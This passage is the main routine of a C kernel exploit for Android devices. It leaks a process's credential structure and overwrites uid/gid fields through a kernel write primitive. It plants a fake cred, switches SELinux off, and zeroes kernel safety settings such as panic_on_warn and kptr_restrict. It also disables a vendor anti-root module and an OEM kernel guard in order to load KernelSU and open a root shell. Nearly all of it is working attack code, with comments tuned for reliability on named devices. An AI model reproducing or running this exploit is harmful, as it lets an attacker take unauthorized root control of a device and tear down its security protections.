                !g_t->tp_sys_exit_static || !g_t->timer_site_low21 ||
                !g_t->copy_process_low21)
            {
                logf("[-] kernel %s matched but the target entry is "
                     "incomplete (fill the _STATIC fields from the "
                     "matching vmlinux)\n", u.release);
                return -1;
            }
            logf("[+] kernel %s -> target %s\n", u.release, g_t->prefix);
            return 0;
        }
    }
    logf("[-] unsupported kernel: %s\n", u.release);
    return -1;
}

int main(int argc, char **argv)
{
    unsigned char *raw;
    int shell_mode = 0, leak_only = 0, ids_only = 0;

    g_debug_logging = getenv("KSU_RUNNER_DEBUG") && !strcmp(getenv("KSU_RUNNER_DEBUG"), "1");
    g_runner_pid = getpid();
    g_child_entry = (argc > 1 && !strcmp(argv[1], "wait")) ||
                    (argv[0] && argv[0][0] == '\0');
    setvbuf(stdout, NULL, _IONBF, 0);

    /* Never die from a closed stdout/stderr pipe. The parked parent holds the
     * fake-cred page via its spray sockets; a SIGPIPE kill would free it while
     * the su daemon's cred->security still points into it, corrupting the
     * kernel. A file-redirecting caller (adb) is safe, but a pipe-based one
     * (the app) closes the reader as soon as the daemon is ready. */
    signal(SIGPIPE, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    signal(SIGTERM, SIG_IGN);

    if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h") ||
                     !strcmp(argv[1], "help")))
    {
        usage(argv[0]);
        return 0;
    }

    if (pick_target())
        return 1;

    /* From the first second: never let lmkd pick a (future) zombie holder. */
    oom_protect_self();

    if (argc > 1 && !strcmp(argv[1], "wait"))
        return wait_child_main(argc > 2 ? argv[2] : "verify");

    if (argc > 1 && !strcmp(argv[1], "shell"))
        shell_mode = 1;
    if (argc > 1 && !strcmp(argv[1], "leak"))
        leak_only = 1;
    if (argc > 1 && !strcmp(argv[1], "ids"))
        ids_only = 1;
    if (argc > 1 && !strcmp(argv[1], "fake"))
        g_fake_stage = 1;

    raw = malloc(48u << 20);
    if (!raw)
        return 1;
    if (argc > 2 && !strcmp(argv[1], "cpu"))
        g_cpu = atoi(argv[2]);

    if (argv[0] && argv[0][0] == '\0')
        _exit(42);

    {
        struct rlimit rl;

        if (!getrlimit(RLIMIT_NOFILE, &rl))
        {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > 65536)
                rl.rlim_cur = 65536;
            (void)setrlimit(RLIMIT_NOFILE, &rl);
        }
    }

    pin(g_cpu);
    (void)setpriority(PRIO_PROCESS, 0, -20);
    logf("[+] pid=%d cpu=%d nice=%d\n", getpid(), g_cpu,
         getpriority(PRIO_PROCESS, 0));
    enable_events();
    kick_rss();
    usleep(50000);

    /* First-run-after-boot is the fragile case: the tracefs buffers and the
     * slab are cold. Retry the two discovery stages a few times instead of
     * giving up, so a single invocation lands without manual re-runs. */
    {
        int ids = 0;
        for (int a = 1; a <= 3 && !ids; a++)
        {
            if (a > 1)
                logf("[-] page id discovery attempt %d/3 failed, retrying\n", a - 1);
            ids = discover_page_types(raw) == 0;
        }
        if (!ids)
            return 1;
    }
    if (ids_only)
        return 0;

    g_base = 0;
    for (int a = 1; a <= 3 && !g_base; a++)
    {
        if (a > 1)
            logf("[-] base calibration attempt %d/3 failed, retrying\n", a - 1);
        g_base = calibrate_base(raw);
    }
    if (!g_base)
    {
        logf("[-] base calibration failed\n");
        return 1;
    }
    prefill_timers(PREFILL_TIMERS);

    /* Create the spray pool and trace fds BEFORE forking the cred-leak child:
     * the child (and the su daemon it execs) then inherits every socket, so
     * the reclaimed fake-cred page stays pinned by the daemon itself for the
     * whole session, independent of the parked parent's lifetime. */
    ensure_pool();
    ensure_raw();

    pid_t C = -1;
    int go_fd = -1, st_fd = -1;
    unsigned long long R = leak_cred(raw, &C, &go_fd, &st_fd, shell_mode,
                                     &g_child_task);
    if (!R)
    {
        logf("[-] cred leak failed\n");
        return 1;
    }
    logf("[+] child=%d cred=%#llx target=%#llx\n", C, R, R + 8);
    if (leak_only)
    {
        close(go_fd);
        close(st_fd);
        kill(C, SIGKILL);
        waitpid(C, NULL, 0);
        logf("[+] leak-only run complete\n");
        return 0;
    }
    if (g_fake_stage)
        logf("[+] fake endgame: full-caps su daemon (SELinux off in userspace)\n");

    if (!g_fake_stage)
    {
        int planted = 0;

        /* Direct cred write first: zero every uid/gid field (uid, suid, euid,
         * fsuid and their gid pairs) so the child is fully root WITHOUT
         * setuid(0), which would re-enter commit_creds and re-trigger vr.ko. */
        planted += zero_write(R + CRED_UID_OFF + 0x00, "cred uid/gid", raw) == 0;
        planted += zero_write(R + CRED_UID_OFF + 0x08, "cred suid/sgid", raw) == 0;
        planted += zero_write(R + CRED_UID_OFF + 0x10, "cred euid/egid", raw) == 0;
        planted += zero_write(R + CRED_UID_OFF + 0x18, "cred fsuid/fsgid", raw) == 0;
        logf("[+] cred zero-writes: %d/4 landed\n", planted);

        /* vr.ko anti-root LAST: strip the syscall-tracepoint work bit + tagA
         * (thread_info.flags word) right before waking the child. */
        if (g_child_task)
            defeat_vr(g_child_task, raw, C);
        else
            logf("[-] vr de-tag skipped: child task not leaked\n");

        if (planted != 4)
            park_forever("cred zero-write incomplete");
    }
    else
    {
        struct plant_res fc;

        if (!g_child_task)
            park_forever("child task not leaked");

        /* vr.ko anti-root: clear thread_info.flags (0x400 work bit + tagA)
         * BEFORE the child becomes root via the fake cred, so vr's sys_exit
         * probe won't kill it (or the KernelSU worker it forks). */
        defeat_vr(g_child_task, raw, C);

        if (!g_slide)
            park_forever("no KASLR slide");
        /* vivo: zero modules_disabled so the rooted child's ksud can
         * late-load kernelsu.ko (finit_module). Same proven-first ordering
         * as the CVE-2026-64560 chain on this device.  Best-effort read
         * first: it is 0 on every boot observed so far, and skipping the
         * plant saves one roll of the burst-race dice.  If the read is
         * denied or nonzero, plant as before. */
        {
            int md = -1;
            FILE *f = fopen("/proc/sys/kernel/modules_disabled", "r");

            if (f)
            {
                if (fscanf(f, "%d", &md) != 1)
                    md = -1;
                fclose(f);
            }
            if (md == 0)
                logf("[+] modules_disabled already 0; skipping plant\n");
            else if (MODULES_DISABLED_STATIC &&
                     stage_write(MODULES_DISABLED_STATIC + g_slide, 0,
                                 "modules_disabled", raw, NULL))
                park_forever("modules_disabled write failed");
        }
        /* OOS7 hooks_defend: kptr_restrict is NOT zeroed here anymore.
         * The guard's kallsyms_open/modules_open/module_sect_read pre
         * handlers re-pin kptr_restrict from a saved copy at every open,
         * so a zero written now would be reverted before any read.  The
         * zero now happens in the post-report block, after the child
         * has already opened /proc/kallsyms (masking is decided per row
         * at read time, against the opening task's f_cred). */
        /* Probe-fallback trial: never overwrite the global probe flags.
         * The old eight-byte stores overlap kprobes_initialized (+4).
         * Per-handler neutralization below is retained; the privileged
         * reader verifies canonical global flags before any module load. */
        /* Zero panic_on_warn BEFORE the fake_cred plant: its self-parent
         * rb_erase takes the RB_EMPTY_NODE WARN, which panics the device when
         * the boot default is panic_on_warn=1. The sysctl read below is only
         * possible after SELinux is off, so gate the direct write here.
         * Best-effort read first (boot default observed 0); plant only if
         * unreadable or nonzero. */
        {
            int pw = read_panic_on_warn();

            if (pw == 0)
                logf("[+] panic_on_warn already 0; skipping plant\n");
            else if (stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                                 "panic_on_warn", raw, NULL))
                park_forever("panic_on_warn write failed");
        }

        memset(&fc, 0, sizeof(fc));
        /*
         * The self-parent erase takes the RB_EMPTY_NODE WARN; this profile's
         * panic_on_warn is 0.  The sysctl is only readable after SELinux is
         * off, so the WARN cannot be gated before this plant.
         *
         * Point task->cred at the reclaimed page.  The fake cred starts at
         * the stale node address; rb_erase dirties uid/gid with the target,
         * so one zero write repairs them.  suid/sgid keep the rb_left
         * target; the fake cred's full CAP_SETUID and euid 0 make that
         * irrelevant for the fork/exec handoff.
         */
        if (stage_write(g_child_task + OFF_TASK_CRED, 2, "fake_cred",
                        raw, &fc))
            park_forever("fake cred write failed");
        if (!g_slide)
            park_forever("no KASLR slide");
        logf("[+] fake cred A=%#llx selinux_state=%#llx\n", fc.A,
             SELINUX_STATE_STATIC + g_slide);
        if (stage_write(SELINUX_STATE_STATIC + g_slide - 7, 0,
                        "selinux", raw, NULL))
            park_forever("selinux write failed");
        if (read_panic_on_warn() != 0 &&
            stage_write(PANIC_ON_WARN_STATIC + g_slide, 0,
                        "panic_on_warn", raw, NULL))
            park_forever("panic_on_warn write failed");
        if (stage_write(fc.A + CRED_UID_OFF, 0, "fake_uid", raw, NULL))
            park_forever("fake uid fix failed");
    }
    logf("[+] cred writes landed, waking child\n");

    if (write(go_fd, "A", 1) != 1)
        logf("[!] child wake write failed\n");
    close(go_fd);

    {
        struct child_report rep;
        struct pollfd pf = {.fd = st_fd, .events = POLLIN};
        ssize_t rn = -1;

        if (poll(&pf, 1, 10000) > 0)
            rn = read(st_fd, &rep, sizeof(rep));
        close(st_fd);
        if (rn == (ssize_t)sizeof(rep) && rep.magic == CHILD_MAGIC)
        {
            logf("[+] child report uid=%d euid=%d setuid(0)=%d errno=%d resuid=%d/%d/%d\n",
                 rep.uid, rep.euid, rep.setuid_ret, rep.setuid_errno,
                 rep.ruid, rep.reuid, rep.rsuid);
            if (rep.setuid_ret != 0 || rep.reuid != 0)
                logf("[!] child did not reach euid 0\n");
        }
        else
        {
            logf("[!] child report missing (n=%zd)\n", rn);
        }
    }

    /* OOS7 hooks_defend neutralize (see the hkd_bpf_setup comment for
     * the full picture).  Sequence:
     *   1. wait for the child's "armed" marker (BPF prog loaded);
     *   2. zero kptr_restrict -- the child's BPF kallsyms_lookup_name
     *      helper polls at ~1ms and sees the unmasked window the moment
     *      it opens, then resolves the module's $d anchors by name and
     *      posts the .bss/.data bases;
     *   3. zero the pre_handler field (+0x40) of all eight hook structs:
     *      the load_module kprobe (0xc8 -> 0x108, the finit deny), the
     *      load_module kretprobe entry (0x148 -> 0x188, the post-load
     *      "rhlm rm" path) and the six .bss+0x410..0x690 probes.  A NULL
     *      pre_handler is the supported no-op case for arm64 kprobes, so
     *      every hit becomes pure bookkeeping -- do these FIRST to stop
     *      all guard action;
     *   4. zero the guard's 14-byte flag/slot table (.data+0x140 =
     *      $d.117_runtime + 0x140, measured not assumed): slot 6 gates
     *      the kptr re-pin, slots 10..13 hold the saved value, slot 8 is
     *      the allow-all bypass and slot 9 the hard lock. */
    if (HKD_ENABLED)
    {
        static const unsigned long long pre[8] = {
            0x108ULL, 0x188ULL, 0x450ULL, 0x4d0ULL,
            0x550ULL, 0x5d0ULL, 0x650ULL, 0x6d0ULL
        };
        unsigned long long base = 0, dbase = 0;
        unsigned long long enodes_extra[3] = {0, 0, 0};
        unsigned long long nfix_extra[2] = {0, 0}; /* module_notify_list
                                                    * unlink targets the
                                                    * child discovered */
        int gated = 0, opened = 0;
        int nen_unused = 0; (void)nen_unused;

        for (int i = 0; i < 50 && !opened; i++) /* 5s for the child arm */
        {
            struct stat st;

            if (stat(HKD_OPEN_PATH, &st) == 0)
                opened = 1;
            else
                usleep(100000);
        }
        if (!opened)
            logf("[!] hkd: child arm marker missing; zeroing kptr anyway\n");
        else
            logf("[+] hkd: child BPF armed; zeroing kptr\n");
        if (KPTR_RESTRICT_STATIC &&
            stage_write(KPTR_RESTRICT_STATIC + g_slide, 0,
                        "kptr_zero", raw, NULL))
            park_forever("kptr_restrict write failed");
        for (int i = 0; i < 700 && !gated; i++) /* 70s; the child's ~1ms
                                                  * poll catches the
                                                  * window instantly */
        {
            int hf;
            char hb[96] = {0};
            ssize_t hn;

            if (i == 200) /* 20s: a system-wide kallsyms open may have
                          * re-pinned it; redo the zero once */
            {
                logf("[*] hkd: no base yet; re-zeroing kptr\n");
                if (KPTR_RESTRICT_STATIC &&
                    stage_write(KPTR_RESTRICT_STATIC + g_slide, 0,
                                "kptr_zero", raw, NULL))
                    park_forever("kptr_restrict rewrite failed");
            }
            usleep(100000);
            hf = open(HKD_BASE_PATH, O_RDONLY | O_CLOEXEC);
            if (hf < 0)
                continue;
            hn = read(hf, hb, sizeof(hb) - 1);
            close(hf);
            if (hn > 8)
            {
                char *sp;
                unsigned long long b1, b2, e1, e2, e3, n1 = 0, n2 = 0;

                errno = 0;
                b1 = strtoull(hb, &sp, 16);
                b2 = (sp && *sp == ' ') ? strtoull(sp + 1, &sp, 16) : 0;
                e1 = (sp && *sp == ' ') ? strtoull(sp + 1, &sp, 16) : 0;
                e2 = (sp && *sp == ' ') ? strtoull(sp + 1, &sp, 16) : 0;
                e3 = (sp && *sp == ' ') ? strtoull(sp + 1, &sp, 16) : 0;
                n1 = (sp && *sp == ' ') ? strtoull(sp + 1, &sp, 16) : 0;
                n2 = (sp && *sp == ' ') ? strtoull(sp + 1, NULL, 16) : 0;
                if (errno == 0 && b1 && b2)
                {
                    base = b1;
                    dbase = b2;
                    enodes_extra[0] = e1;
                    enodes_extra[1] = e2;
                    enodes_extra[2] = e3;
                    nfix_extra[0] = n1;
                    nfix_extra[1] = n2;
                    gated = 1;
                }
            }
        }
        if (gated)
        {
            /* Slot list, index-identical to the child's.  ALL offsets
             * are .bss-relative (.data = .bss + 0x710): 8 pre_handlers
             * + 2 flag-table words (.data+0x140/0x148).  The notifier
             * words are deliberately absent -- see the child's
             * module_notify_list walk (zeroing a registered nb's call
             * field = NULL-call panic; we unlink instead). */
            static const unsigned long long slots[10] = {
                0x108ULL, 0x188ULL, 0x450ULL, 0x4d0ULL, 0x550ULL,
                0x5d0ULL, 0x650ULL, 0x6d0ULL, 0x850ULL, 0x858ULL
            };
            static const char *names[10] = {
                "hkd_pre0", "hkd_pre1", "hkd_pre2", "hkd_pre3",
                "hkd_pre4", "hkd_pre5", "hkd_pre6", "hkd_pre7",
                "hkd_flags0", "hkd_flags1"
            };
            /* Load-gate-first ordering.  The load gate is:
             * pre0 (+0x108, the load_module kprobe deny), pre1
             * (+0x188, the load_module kretprobe whose return handler
             * rhlm-rm's the module), and the module_notify_list UNLINK
             * (-2: detaches the mnc_nb MODULE_STATE_COMING deny the
             * safe way).  Clear those, attempt the load EARLY ("K"),
             * and only keep planting if it failed -- every additional
             * plant is another roll of the burst-race dice, and a
             * crash after a successful load loses the module. */
            static const int order[] = {0, 1, -2, -3, -1,
                                        2, 3, 4, 5, 6, 7, 8, 9};
            int early_ksu = 0;
            int failures = 0;

            (void)unlink(HKD_BASE_PATH);
            (void)unlink(HKD_GO_PATH);
            /* Per-slot handshake with the child (which verifies each
             * write via the BPF kernel-read and replies ok/fail).
             * A "fail" means the plant completed but the zero did not
             * land (false-positive burst -- observed live); retry the
             * write up to 3 times, then continue with the remaining
             * slots. */
            for (int oi = 0; oi < (int)(sizeof(order) / sizeof(order[0]));
                 oi++)
            {
                int s = order[oi];
                unsigned long long tgt;
                int ok = 0;

                if (s == -3)
                {
                    /* Heap + .bss guard-probe sweep results: the child
                     * wrote every guard-owned kprobe node to
                     * hkd_extras (matched by module-path addr or by
                     * pre_handler inside the guard's .text window).
                     * Zero each pre_handler (node+0x40), then ask the
                     * child to re-sweep ("R"); survivors get replanted
                     * for up to 2 rounds. */
                    for (int round = 0; round < 2; round++)
                    {
                        FILE *ef = fopen("/data/local/tmp/hkd_extras", "r");
                        char eline[64];
                        int planted = 0;

                        if (!ef)
                        {
                            logf("[!] hkd: no extras file (sweep "
                                 "skipped?)\n");
                            break;
                        }
                        while (fgets(eline, sizeof(eline), ef))
                        {
                            unsigned long long node;
                            char nm[24];

                            node = strtoull(eline, NULL, 16);
                            if (!node ||
                                node < 0xffffff0000000000ULL)
                                continue;
                            snprintf(nm, sizeof(nm), "hkd_extra%d",
                                     planted);
                            if (stage_write(node + 0x40ULL, 0, nm, raw,
                                            NULL))
                                park_forever("hkd extra probe write failed");
                            logf("[+] hkd: extra probe node=%#llx "
                                 "cleared (round %d)\n", node, round);
                            planted++;
                        }
                        fclose(ef);
                        if (!planted)
                            break;
                        /* verify by re-sweep */
                        {
                            int gf = open(HKD_GO_PATH,
                                          O_WRONLY | O_CREAT | O_TRUNC |
                                              O_CLOEXEC,
                                          0666);
                            int tries, clean = 0;
                            char rb[32] = {0};

                            if (gf >= 0)
                            {
                                (void)write(gf, "R", 1);
                                close(gf);
                            }
                            (void)unlink(HKD_BASE_PATH);
                            for (tries = 0; tries < 120 && !clean; tries++)
                            {
                                int rf;

                                usleep(100000);
                                rf = open(HKD_BASE_PATH,
                                          O_RDONLY | O_CLOEXEC);
                                if (rf < 0)
                                    continue;
                                (void)!read(rf, rb, sizeof(rb) - 1);
                                close(rf);
                                if (!strncmp(rb, "ok", 2))
                                    clean = 1;
                                else if (!strncmp(rb, "fail", 4))
                                    break;
                            }
                            if (clean)
                            {
                                logf("[+] hkd: guard-probe sweep clean "
                                     "after round %d\n", round);
                                break;
                            }
                            logf("[!] hkd: sweep round %d: survivors "
                                 "remain; replanting\n", round);
                        }
                    }
                    continue;
                }
                if (s == -2)
                {
                    /* module_notify_list unlink plants: zero the link(s)
                     * pointing at the guard's notifier_block(s).  The
                     * child discovered the addresses during the chain
                     * walk and verifies each zero via the N1/N2
                     * handshake. */
                    for (int ni = 0; ni < 2; ni++)
                    {
                        int ok = 0;

                        if (!nfix_extra[ni])
                            continue;
                        for (int attempt = 1; attempt <= 3 && !ok; attempt++)
                        {
                            char nm[16];
                            int gf, tries;

                            snprintf(nm, sizeof(nm), "hkd_unlink%d",
                                     ni + 1);
                            if (stage_write(nfix_extra[ni], 0, nm, raw,
                                            NULL))
                                park_forever("hkd unlink write failed");
                            gf = open(HKD_GO_PATH,
                                      O_WRONLY | O_CREAT | O_TRUNC |
                                          O_CLOEXEC,
                                      0666);
                            if (gf >= 0)
                            {
                                (void)dprintf(gf, "N%d", ni + 1);
                                close(gf);
                            }
                            (void)unlink(HKD_BASE_PATH);
                            for (tries = 0; tries < 120 && !ok; tries++)
                            {
                                int rf;
                                char rb[32] = {0};

                                usleep(100000);
                                rf = open(HKD_BASE_PATH,
                                          O_RDONLY | O_CLOEXEC);
                                if (rf < 0)
                                    continue;
                                (void)!read(rf, rb, sizeof(rb) - 1);
                                close(rf);
                                if (!strncmp(rb, "ok", 2))
                                    ok = 1;
                                else if (!strncmp(rb, "fail", 4))
                                    break;
                            }
                            logf(ok
                                     ? "[+] hkd: unlink%d (%#llx) verified "
                                       "zero (attempt %d)\n"
                                     : "[!] hkd: unlink%d (%#llx) NOT "
                                       "verified (attempt %d)\n",
                                 ni + 1, nfix_extra[ni], attempt);
                        }
                        if (!ok)
                        {
                            logf("[!] hkd: unlink%d FAILED; the mnc_nb "
                                 "deny may still fire\n", ni + 1);
                            failures++;
                        }
                    }
                    continue;
                }
                if (s < 0)
                {
                    char rb[32] = {0};
                    int gf, tries, klisted = 0;

                    logf("[+] hkd: minimal load-gate cleared; attempting "
                         "EARLY module load\n");
                    /* Survivable-failure switch: with panic_on_oops=0 a
                     * faulting module init kills only the insmodf task
                     * (oops + backtrace in dmesg, load fails cleanly)
                     * instead of panicking the kernel -- turning every
                     * future init fault into legible evidence.  Planted
                     * here (before the first load) each boot. */
                    if (stage_write(0xffffffc08216a920ULL + g_slide, 0,
                                    "panic_on_oops", raw, NULL))
                        logf("[!] hkd: panic_on_oops plant failed "
                             "(non-fatal)\n");
                    /* Global probe flags were never modified in this trial. */
                    (void)unlink(HKD_BASE_PATH);
                    gf = open(HKD_GO_PATH,
                              O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
                    if (gf >= 0)
                    {
                        (void)write(gf, "K", 1);
                        close(gf);
                    }
                    /* the stage script can take ~60s (ksupatch, insmodf,
                     * late-load fallback + poll loop) */
                    for (tries = 0; tries < 900 && !klisted; tries++)
                    {
                        int rf;

                        usleep(100000);
                        if (module_listed()) {
                            klisted = 1;
                            break;
                        }
                        rf = open(HKD_BASE_PATH, O_RDONLY | O_CLOEXEC);
                        if (rf < 0)
                            continue;
                        (void)!read(rf, rb, sizeof(rb) - 1);
                        close(rf);
                        if (!strncmp(rb, "ksu", 3))
                            klisted = 1;
                        else if (!strncmp(rb, "no", 2))
                            break;
                    }
                    if (klisted)
                    {
                        early_ksu = 1;
                        logf("[+] hkd: MODULE LIVE after early load; "
                             "skipping remaining slots\n");
                        break;
                    }
                    logf("[*] hkd: early load failed; clearing remaining "
                         "slots\n");
                    continue;
                }
                tgt = base + slots[s];
                for (int attempt = 1; attempt <= 3 && !ok; attempt++)
                {
                    char hb[32] = {0};
                    int gf, tries;

                    if (stage_write(tgt, 0, names[s], raw, NULL))
                        park_forever("hkd slot write failed");
                    /* tell the child which slot to verify */
                    gf = open(HKD_GO_PATH,
                              O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);
                    if (gf < 0)
                        break;
                    (void)dprintf(gf, "%d", s);
                    close(gf);
                    (void)chmod(HKD_GO_PATH, 0666);
                    /* wait for the child's ok/fail reply */
                    for (tries = 0; tries < 120 && !ok; tries++)
                    {
                        int rf;
                        char rb[32] = {0};

                        usleep(100000);
                        rf = open(HKD_BASE_PATH, O_RDONLY | O_CLOEXEC);
                        if (rf < 0)
                            continue;
                        (void)!read(rf, rb, sizeof(rb) - 1);
                        close(rf);
                        if (!strncmp(rb, "ok", 2))
                            ok = 1;
                        else if (!strncmp(rb, "fail", 4))
                            break;
                    }
                    if (ok)
                        logf("[+] hkd: %s verified zero (attempt %d)\n",
                             names[s], attempt);
                    else
                        logf("[!] hkd: %s NOT verified (attempt %d)\n",
                             names[s], attempt);
                }
                if (!ok)
                {
                    logf("[!] hkd: %s FAILED after 3 attempts; "
                         "continuing\n", names[s]);
                    failures++;
                }
            }
            /* (heap-probe extras were cleared in the -3 stage above,
             * as part of the load gate) */
            /* release the child (non-digit marker so it cannot alias
             * slot 0) */
            {
                int gf = open(HKD_GO_PATH,
                              O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);

                if (gf >= 0)
                {
                    (void)write(gf, "END", 3);
                    close(gf);
                }
            }
            logf(early_ksu
                     ? "[+] hkd: MODULE LIVE via early load; guard left "
                       "partially armed (safe: load path proven open)\n"
                     : (failures == 0
                            ? "[+] hkd: guard neutralized (10/10 slots "
                              "+ unlink verified)\n"
                            : "[!] hkd: guard PARTIALLY neutralized "
                              "(%d failed)\n"),
                failures);
        }
        else
        {
            logf("[!] hkd: no bases posted; skipping neutralize\n");
            /* Release the child (diagnostics path). */
            {
                int gf = open(HKD_GO_PATH,
                              O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0666);

                if (gf >= 0)
                {
                    (void)write(gf, "END", 3);
                    close(gf);
                }
            }
        }
        (void)unlink(HKD_OPEN_PATH);
    }

    {
        int st = 0;

        if (waitpid(C, &st, 0) == C)
            logf("[+] child exit status=%#x\n", st);
    }
    if (g_fake_stage)
        park_forever("fake cred page held; reboot to clean");
    if (g_held)
        park_forever("root shell finished; failed-plant zombies are held");
    logf("[+] done\n");
    return 0;
}
